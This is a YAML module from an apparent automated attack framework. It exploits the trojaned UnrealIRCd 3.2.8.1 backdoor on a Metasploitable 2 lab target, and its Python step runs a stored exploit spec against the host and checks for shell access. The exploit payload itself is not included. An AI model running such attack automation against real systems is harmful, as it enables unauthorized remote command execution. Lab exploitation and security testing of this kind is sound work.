name: MS2 UnrealIRCd 3.2.8.1 Backdoor
description: >
  The trojaned UnrealIRCd 3.2.8.1 tarball runs commands on a magic string (CVE-2010-2075).
  Delegates to the framework's verified exploit spec (exploits/ms2_unrealircd_backdoor.yaml)
  through run_spec, which drives the persistent target session.
platforms:
- linux
scenario: metasploitable
vector: ms2_unrealircd_backdoor
mitre: T1190
trigger:
- irc
steps:
- kind: lazymode
  lang: python
  timeout: 240
  run: |
    import re

    from modules.atomic_exploit_bridge import load_all, run_spec

    result = {"target": target, "vector": "ms2_unrealircd_backdoor"}
    spec = load_all().get("ms2_unrealircd_backdoor")
    if spec is None:
        result["session_opened"] = False
        result["error"] = "exploit spec ms2_unrealircd_backdoor not found in exploits/"
    else:
        outcome = run_spec(spec, rhost=target)
        blob = outcome.get("output") or ""
        match = re.search(r"uid=\d+\([^)]*\)[^\n]*", blob)
        result["cve"] = spec.cve
        result["session_opened"] = bool(outcome.get("shell"))
        result["success"] = bool(outcome.get("success"))
        result["proof"] = (match.group(0).strip() if match else blob[-300:].strip()) or "(no proof)"
